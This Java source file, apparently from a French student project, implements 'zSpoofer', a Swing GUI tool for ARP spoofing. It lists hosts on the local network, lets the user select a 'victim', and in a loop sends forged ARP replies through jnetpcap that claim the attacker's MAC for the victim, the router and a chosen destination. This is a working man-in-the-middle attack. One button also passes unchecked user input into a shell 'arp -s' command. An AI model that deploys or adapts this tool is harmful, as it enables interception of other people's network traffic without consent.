
package NotreProjet;

import java.awt.BorderLayout;
import java.awt.Color;
import java.awt.Component;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.io.File;
import java.io.IOException;
import java.nio.ByteBuffer;
import java.util.ArrayList;
import java.util.List;
import java.util.Observable;
import java.util.Observer;

import javax.swing.BorderFactory;
import javax.swing.JButton;
import javax.swing.JComboBox;
import javax.swing.JFrame;
import javax.swing.JOptionPane;
import javax.swing.JPanel;
import javax.swing.JProgressBar;
import javax.swing.JScrollPane;
import javax.swing.JTable;
import javax.swing.JTextArea;
import javax.swing.ListSelectionModel;
import javax.swing.UIManager;
import javax.swing.event.ListSelectionEvent;
import javax.swing.event.ListSelectionListener;
import javax.swing.table.AbstractTableModel;
import javax.swing.table.TableCellRenderer;

import org.jb2011.lnf.beautyeye.BeautyEyeLNFHelper;
import org.jnetpcap.PcapIf;
import org.jnetpcap.packet.JPacket;


public class zSpoofer extends javax.swing.JFrame implements Observer {


    private materielsTableModel tableModel = new materielsTableModel();
    public static int interface_number=0;
    private JTable table;
    private JButton StopButton = new JButton("Stop");
    private JButton SpoofButton = new JButton("spoof");

    public static boolean ar=true;  public static boolean mar=true;   public static boolean nouv=true;
    public static boolean rec=true;  public static boolean choi=true;  public static boolean sto=true;

    private Spoof selectedMachine;
    
    private boolean clearing;

	public Machine_Connectée_IP_Mac Router_IP;

	public String CapturePath;
    public zSpoofer() {
        initComponents();
    }
                          
    private void initComponents()  {
    	
    	SpoofButton.setEnabled(false);
        jScrollPane1 = new javax.swing.JScrollPane();
        jLabel1 = new javax.swing.JLabel();
        Nics = new javax.swing.JComboBox<>();
        addPanel = new javax.swing.JPanel();
        
        setTitle("SPOOFER");
        setName("Frame"); // NOI18N

        

        jLabel1.setText("Selectionez une iterface reseau :");
        ListDesInterfaces NICS = new ListDesInterfaces();
        List <String> NameInterface = NICS.getmaterielsNames();
        String []  Items  = new String[NameInterface.size()] ;
        short number=0;
        for(String materiel:NameInterface){
        	Items[number]=materiel;
        	number+=1;
        }
        Nics.setModel(new javax.swing.DefaultComboBoxModel<>(Items));
        
        
        
        //////////////////////////////////////////selection de l'inerface/////////////////////////////////////
        Nics.addActionListener(new ActionListener() {
			
			@SuppressWarnings("rawtypes")
			@Override
			public void actionPerformed(ActionEvent e) {
				JComboBox cb = (JComboBox)e.getSource();
		       String Selected_interface=((String)cb.getSelectedItem());
		       for(int index=0;index<NameInterface.size();index++){
		    	  
		    	   if(NameInterface.get(index).equals(Selected_interface)){
		    		   interface_number=index;
		    		   /*
		    		   System.out.println(NameInterface.get(index));
		    		   System.out.println((interface_number));
		    		   */
		    	   }
		       }
				
			}
		});
        
        ///////////////////////////////////////////////////////////////////////////////////////////////////////////////
        
        
        
        
        javax.swing.GroupLayout addPanelLayout = new javax.swing.GroupLayout(addPanel);
        addPanel.setLayout(addPanelLayout);
        addPanelLayout.setHorizontalGroup(
            addPanelLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGap(0, 452, Short.MAX_VALUE)
        );
        addPanelLayout.setVerticalGroup(
            addPanelLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGap(0, 273, Short.MAX_VALUE)
        );

        

       
        

       
        ////////////////declaraton des boutton////////////////////////////////////
        JPanel Panel = new JPanel();
        JButton addButton = new JButton("chercher des machines");
        JButton arp = new JButton("Table Arp");
        JButton Cd = new JButton("entrer le destinataire de la victime");
        JButton ND = new JButton("NouveauDevice");
/////////////////////////////////////////////////////////////////////////////////////

        
        addButton.addActionListener(new ActionListener() {
          public void actionPerformed(ActionEvent e) {
            try {
            	
    			actionRecheche();
    		} catch (IOException | InterruptedException e1) {
    			
    			
    		}
          }
        });
        
        
        arp.addActionListener(new ActionListener() {
            public void actionPerformed(ActionEvent e) {
              try {
      			actionAddARP();
      		} catch (IOException | InterruptedException e1) {
      			
      			
      		}
            }
          });
        
        
      
        Cd.addActionListener(new ActionListener() {
            public void actionPerformed(ActionEvent e) {
            	zSpoofer.Cdact=true;
                       JFrame frame = new JFrame();
                       String choiceIP; 
                     choiceIP = JOptionPane.showInputDialog(frame, "Entrez le destinataire:");
                 zSpoofer.CD=choiceIP;
            }
          });
        
        
        ND.addActionListener(new ActionListener() {
            public void actionPerformed(ActionEvent e) {
                       JFrame frame = new JFrame();
                       String choiceIP;  String choicemac; 
                     choiceIP = JOptionPane.showInputDialog(frame, "Entrez ip: exemple:192.168.1.1");
                 choicemac = JOptionPane.showInputDialog(frame, "Entrez  mac: exemple:11-22-33-44-55-66");
                 Process p;
				try {
					p = Runtime.getRuntime().exec("arp -s "+choiceIP+" "+choicemac.replaceAll(":", "-").toLowerCase());
					p.waitFor();
					zSpoofer.nouvDevIP=choiceIP;zSpoofer.nouvDevMac=choicemac;
					actionNouveauDevice();
				} catch (IOException | InterruptedException e1) {
					// TODO Auto-generated catch block
					e1.printStackTrace();
				}
         	
            }
          });
   ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
        
        
        
        
        
        
       
        //ajout des bouttons//
        Panel.add(addButton);
        Panel.add(arp);
        Panel.add(Cd);
        Panel.add(ND);
       ////////////////////// 
        
        
        
        
        
table = new JTable(tableModel);
table.setSelectionBackground(Color.red);
table.setBackground(Color.cyan);

        



///////////////////////////la selection au tableau////////////////////////////////
table.getSelectionModel().addListSelectionListener(new ListSelectionListener() {
          public void valueChanged(ListSelectionEvent e) {
            tableSelectionChanged();
          }
        });
////////////////////////////////////////////////////////////////////////////////


        table.setSelectionMode(ListSelectionModel.SINGLE_SELECTION);



        JPanel materiels = new JPanel();
        materiels.setBorder(BorderFactory.createTitledBorder("materiels"));
        materiels.setLayout(new BorderLayout());
        materiels.add(new JScrollPane(table), BorderLayout.CENTER);

        JPanel buttonsPanel = new JPanel();

        
        
        
        //////////////////////boutton spoof stop/////////////////////////////////////
        StopButton.addActionListener(new ActionListener() {
          public void actionPerformed(ActionEvent e) {
            actionStop();
          }
        });
        
        SpoofButton.addActionListener(new ActionListener() {
            public void actionPerformed(ActionEvent e) {
              actionSpoof();
            }
          });
        ////////////////////////////////////////////////////////////////////////////////
        
        
        
        SpoofButton.setEnabled(true);
        buttonsPanel.add(SpoofButton);
        
        StopButton.setEnabled(false);
        buttonsPanel.add(StopButton);
//ajout des panel//////////////////////////////////////////
        addPanel.setLayout(new BorderLayout());
        addPanel.add(Panel, BorderLayout.NORTH);
        addPanel.add(materiels, BorderLayout.CENTER);
        addPanel.add(buttonsPanel, BorderLayout.SOUTH);
        //////////////////////////////////////////////////////////
        
        
        
        
        
        
        
        javax.swing.GroupLayout layout = new javax.swing.GroupLayout(getContentPane());
        getContentPane().setLayout(layout);
       layout.setHorizontalGroup(
            layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(javax.swing.GroupLayout.Alignment.TRAILING, layout.createSequentialGroup()
                .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                    .addGroup(layout.createSequentialGroup()
                        .addGap(18, 18, 18)
                        .addComponent(jLabel1)
                        .addGap(49, 49, 49)
                        .addComponent(Nics, javax.swing.GroupLayout.PREFERRED_SIZE, 189, javax.swing.GroupLayout.PREFERRED_SIZE))
                    .addGroup(layout.createSequentialGroup()
                        .addContainerGap()
                        .addComponent(addPanel, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE)))
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED, 18, Short.MAX_VALUE)
                .addComponent(jScrollPane1, javax.swing.GroupLayout.PREFERRED_SIZE, 0, javax.swing.GroupLayout.PREFERRED_SIZE)
                .addContainerGap())
        );
        layout.setVerticalGroup(
            layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(javax.swing.GroupLayout.Alignment.TRAILING, layout.createSequentialGroup()
                .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.TRAILING)
                    .addGroup(layout.createSequentialGroup()
                        .addContainerGap()
                        .addComponent(jScrollPane1))
                    .addGroup(layout.createSequentialGroup()
                        .addGap(26, 26, 26)
                        .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.BASELINE)
                            .addComponent(jLabel1)
                            .addComponent(Nics, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE))
                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED, 51, Short.MAX_VALUE)
                        .addComponent(addPanel, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE)))
                .addGap(30, 30, 30))
        );

        pack();
    }                        

    
    //////////////////////////////methode du boutton chercher des machines/////////////////////////////////
    private void actionRecheche() throws IOException, InterruptedException {
    	 CapturePath=new Cmd().Recheche();
    	
    	 Affichage_des_Machines_au_tableau materielsList = new Affichage_des_Machines_au_tableau(new File(CapturePath));
     @SuppressWarnings("unchecked")
  List <Machine_Connectée_IP_Mac> L = materielsList.ReadFromFile();
      if(!L.isEmpty()){
      	for(Machine_Connectée_IP_Mac materiel : L){
        tableModel.addmateriel(new Spoof(materiel));
      	}
      	
      } else {
        JOptionPane.showMessageDialog(this, "aucune machine trouvée", "Erreur",
            JOptionPane.ERROR_MESSAGE);
      }
    }
    ///////////////////////////////////////////////////////////////////////////////////////////////////////////////
    
    
    
    
    
//////////////////////////////////////////////methode du button nouveau device//////////////////////////////////////////////
    private void actionNouveauDevice() throws IOException, InterruptedException {
   	 CapturePath=new Cmd().NouvDev();
   	
   	 Affichage_des_Machines_au_tableau materielsList = new Affichage_des_Machines_au_tableau(new File(CapturePath));
    @SuppressWarnings("unchecked")
 List <Machine_Connectée_IP_Mac> L = materielsList.ReadFromFile();
     if(!L.isEmpty()){
     	for(Machine_Connectée_IP_Mac materiel : L){
       tableModel.addmateriel(new Spoof(materiel));
     	}
     	
     } else {
       JOptionPane.showMessageDialog(this, "aucune machine trouvée", "Erreur",
           JOptionPane.ERROR_MESSAGE);
     }
   }
    //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
   
    
    
    
    /////////////////////////////////////////////////methode du boutton table arp////////////////////////////////////
    private void actionAddARP() throws IOException, InterruptedException {
   	 CapturePath=new Cmd().ARP();
   	
   	Affichage_des_Machines_au_tableau materielsList = new Affichage_des_Machines_au_tableau(new File(CapturePath));
    @SuppressWarnings("unchecked")
 List <Machine_Connectée_IP_Mac> L = materielsList.ReadFromFile();
     if(!L.isEmpty()){
     	for(Machine_Connectée_IP_Mac materiel : L){
       tableModel.addmateriel(new Spoof(materiel));
     	}
     	
     } else {
       JOptionPane.showMessageDialog(this, "impossible d'afficher", "Erreur",
           JOptionPane.ERROR_MESSAGE);
     }
   }
    //////////////////////////////////////////////////////////////////////////////////////////////////////
      
    
    public static boolean Cdact=false;//pour choisir le destinataire

public static int xli;
public static String CD;//reçoit le detinataire/////////////////


public static String nouvDevIP;public static String nouvDevMac;//recoivent le nouveau device//

   

//////////////////////////////la selection au tableau qui a changer/////////////////
private void tableSelectionChanged() {
      if (selectedMachine != null)
        selectedMachine.deleteObserver(zSpoofer.this);

      if (!clearing && table.getSelectedRow() > -1) {
        selectedMachine = tableModel.getmateriel(table.getSelectedRow());
//        xli=(int) table.getValueAt(table.getSelectedRow(), 0);
       // System.out.println(xli);
        selectedMachine.addObserver(zSpoofer.this);
        updateButtons();
      }
    }
    ////////////////////////////////////////////////////////////////////////////////


    private void actionStop() {//stop
      selectedMachine.Stop();
      updateButtons();
    }
  private void actionSpoof(){//spoof
  	selectedMachine.Spoof();
  }
    private void updateButtons() {//ennable true ou false pour les boutton spoof et stop
      if (selectedMachine != null) {
        int status = selectedMachine.getStatus();
        switch (status) {
        case Spoof.Spoofing:
          StopButton.setEnabled(true);
          SpoofButton.setEnabled(false);
          
          break;
        case Spoof.Stop_Spoofing:
      	  StopButton.setEnabled(false);
          SpoofButton.setEnabled(true);
         
          break;
        
        default: 
      	 StopButton.setEnabled(false);
          SpoofButton.setEnabled(false);
         
        }
      } else {
      	StopButton.setEnabled(false);
        SpoofButton.setEnabled(false);
     
      }
    }
/////////////////////////////////////////////////////////////////////////////////////////////////////////////////
    
    
    //si deja spoofer//
    public void update(Observable o, Object arg) {
      if (selectedMachine != null && selectedMachine.equals(o))
        updateButtons();
    }

    
            
   
    private javax.swing.JComboBox<String> Nics;
   
    private javax.swing.JPanel addPanel;
    private javax.swing.JLabel jLabel1;
    private javax.swing.JScrollPane jScrollPane1;
    // End of variables declaration                   
}



class Spoof extends Observable implements Runnable {


  public static final String STATUSES[] = { "Spoofing...", "Not Spoofed" };

  public static final int Spoofing = 0;

  public static final int Stop_Spoofing= 1;

  private String IP_ADDRESS;
  private String MAC_ADDRESS; 
  private int status;   private int Num; 

 
  public Spoof(Machine_Connectée_IP_Mac materiel) {
    this.IP_ADDRESS = materiel.getIP_Address();
   this.MAC_ADDRESS=materiel.getMAC_Address();
   this.Num=materiel.getNumber();
    status = Stop_Spoofing;

  }
  public String getIP_ADDRESS() {
    return IP_ADDRESS;
  }
  
  public String getMAC_ADDRESS() {
    return MAC_ADDRESS;
  }
  
  public int getStatus() {
    return status;
  }
  public int getNumber() {
	    return Num;
	  }
  public void Stop() {
    status = Stop_Spoofing;
    stateChanged();
  }

  public void Spoof() {
    status = Spoofing;
    stateChanged();
    Commencer_le_Spoofing();
  }



  private void Commencer_le_Spoofing() {
    Thread thread = new Thread(this);
 
    thread.start();
    
  }
int conteur=0;
  public void run() {
	  conteur=0;
	  try {
		  
		  Address attacker = new Address();
		  Creation_PacketARP Ethernet = new Creation_PacketARP();
			
			String CapturePath=new Cmd().ARP();
			Affichage_des_Machines_au_tableau materielsList = new Affichage_des_Machines_au_tableau(new File(CapturePath));
			     @SuppressWarnings("unchecked")
				List <Machine_Connectée_IP_Mac> L = materielsList.ReadFromFile();
			    
			     Machine_Connectée_IP_Mac Router = L.get(0);
			     
			     
			     String Router_IP =new Address().IPtoHex(Router.getIP_Address()).toString();
			     
			     String Router_MAC=Router.getMAC_Address().replace("-","");
			     Machine_Connectée_IP_Mac destination = L.get(0); 
			     
			  
			     
			   
                 String destination_IP =new Address().IPtoHex(destination.getIP_Address()).toString();
                
                 if(zSpoofer.Cdact==true){
                	 destination_IP =new Address().IPtoHex(zSpoofer.CD).toString();
				     }else{
				    	 destination_IP =new Address().IPtoHex("192.168.1.1").toString();
				     }
                 
                
                
			     
                 String destination_MAC="000000000000";
			     
			     
			    
			     String Victim_IP=new Address().IPtoHex(getIP_ADDRESS()).toString();
			     System.out.println("victimIp :"+Victim_IP);
			     String MyMac=attacker.getMacAddress();
			     String Victim_Mac=getMAC_ADDRESS().replaceAll("-", "");
			    
			     JPacket ArpResponseToTheExpeditor=Ethernet.Generate_ArpReply(MyMac, Victim_Mac,destination_IP ,Victim_IP);
			     JPacket ArpResponseToTheVictim=Ethernet.Generate_ArpReply(MyMac, Victim_Mac,Router_IP ,Victim_IP);
			    
			     JPacket ArpResponseToTheDestination=Ethernet.Generate_ArpReply(MyMac, destination_MAC,Victim_IP ,destination_IP);
			     JPacket ArpResponseToTheDestination_ImRouter=Ethernet.Generate_ArpReply(MyMac, destination_MAC,Router_IP ,destination_IP);
				 
			     
			     JPacket ArpResponseToTheRouter=Ethernet.Generate_ArpReply(MyMac, Router_MAC, Victim_IP, Router_IP);
			     JPacket ArpResponseToTheRouter_ImDES=Ethernet.Generate_ArpReply(MyMac, Router_MAC,  destination_IP, Router_IP);
				
			     System.out.println("ArpResponseToThedestination : im the expeditor(victim)"+ArpResponseToTheDestination);
			     System.out.println("ArpResponseToThedestination : im the router "+ArpResponseToTheDestination_ImRouter);
                 
			     System.out.println("ArpResponseToTheexpeditor(victim) : im your destination "+ArpResponseToTheExpeditor);
				 System.out.println("ArpResponseToTheVictim : Im the router"+ArpResponseToTheVictim);
				
				 System.out.println("ArpResponseToTheRouter: Im The Victim"+ArpResponseToTheRouter);
				 System.out.println("ArpResponseToTheRouter: Im The Victim destination"+ArpResponseToTheRouter_ImDES);
				 while(getStatus()!= 1){
					
					
		    ByteBuffer a = ByteBuffer.wrap( ArpResponseToTheVictim.getByteArray(0,ArpResponseToTheVictim.size() ));
			ByteBuffer b = ByteBuffer.wrap( ArpResponseToTheRouter.getByteArray(0,ArpResponseToTheRouter.size() ));
			ByteBuffer c = ByteBuffer.wrap( ArpResponseToTheDestination.getByteArray(0,ArpResponseToTheDestination.size() ));
			ByteBuffer d = ByteBuffer.wrap( ArpResponseToTheExpeditor.getByteArray(0,ArpResponseToTheExpeditor.size() ));
			ByteBuffer e = ByteBuffer.wrap( ArpResponseToTheDestination_ImRouter.getByteArray(0,ArpResponseToTheDestination_ImRouter.size() ));
			ByteBuffer f = ByteBuffer.wrap( ArpResponseToTheRouter_ImDES.getByteArray(0,ArpResponseToTheRouter_ImDES.size() ));
		    
			
			
			Commencer_le_Spoofing Spoof = new Commencer_le_Spoofing();
		    List <PcapIf> Nics =Spoof.getNics();
		   ///////////////////////////////////////////////////////////////////////////////////////////////////////////////////
			PcapIf interface_reseau=Spoof.Preparer_materiel(Nics, zSpoofer.interface_number);
		    System.out.println(interface_reseau.getName()+zSpoofer.interface_number);
		   
		    
		    
		    Spoof.Envoyer_Frame(interface_reseau, a );
		    Spoof.Envoyer_Frame(interface_reseau, b );
		    Spoof.Envoyer_Frame(interface_reseau, c );
		    Spoof.Envoyer_Frame(interface_reseau, d );
		  Spoof.Envoyer_Frame(interface_reseau, e );
		    Spoof.Envoyer_Frame(interface_reseau, f );
		    
		    
		    System.out.println("nbReplay :"+conteur);
	  stateChanged();
	  Thread.sleep(20000);
	conteur++;
	 
		  }
	  
	  } catch (Exception e) {
			
		}
 
  }

  private void stateChanged() {
    setChanged();
    notifyObservers();
  }
}

@SuppressWarnings("serial")
class materielsTableModel extends AbstractTableModel implements Observer {
  private static final String[] columnNames = { "IP Address", "Mac Address", "Status" };

  @SuppressWarnings("rawtypes")
private static final Class[] columnClasses = { String.class, String.class,
      String.class,String.class };

  private ArrayList<Spoof> materielList = new ArrayList<Spoof>();

  public void addmateriel(Spoof materiel) {
    materiel.addObserver(this);
    materielList.add(materiel);
    fireTableRowsInserted(getRowCount() - 1, getRowCount() - 1);
  }

  public Spoof getmateriel(int row) {
    return (Spoof) materielList.get(row);
  }


  public int getColumnCount() {
    return columnNames.length;
  }

  public String getColumnName(int col) {
    return columnNames[col];
  }

  @SuppressWarnings({ "unchecked", "rawtypes" })
public Class getColumnClass(int col) {
    return columnClasses[col];
  }

  public int getRowCount() {
    return materielList.size();
  }

  public Object getValueAt(int row, int col) {
    Spoof materiel = materielList.get(row);
    
    switch (col) {
    	case 0:
    		return materiel.getIP_ADDRESS();
    	case 1: 
    		String mac = materiel.getMAC_ADDRESS();
    		return mac;
    	case 2:
    		return Spoof.STATUSES[materiel.getStatus()];
    	
    }
    		return "";
  }

  public void update(Observable o, Object arg) {
    int index = materielList.indexOf(o);
    fireTableRowsUpdated(index, index);
  }
  
}


@SuppressWarnings("serial")
class ProgressRenderer extends JProgressBar implements TableCellRenderer {
  public Component getTableCellRendererComponent(JTable table, Object value, boolean isSelected,
      boolean hasFocus, int row, int column) {
	  setValue((int) ((Float) value).floatValue());
    return this;
  }
}
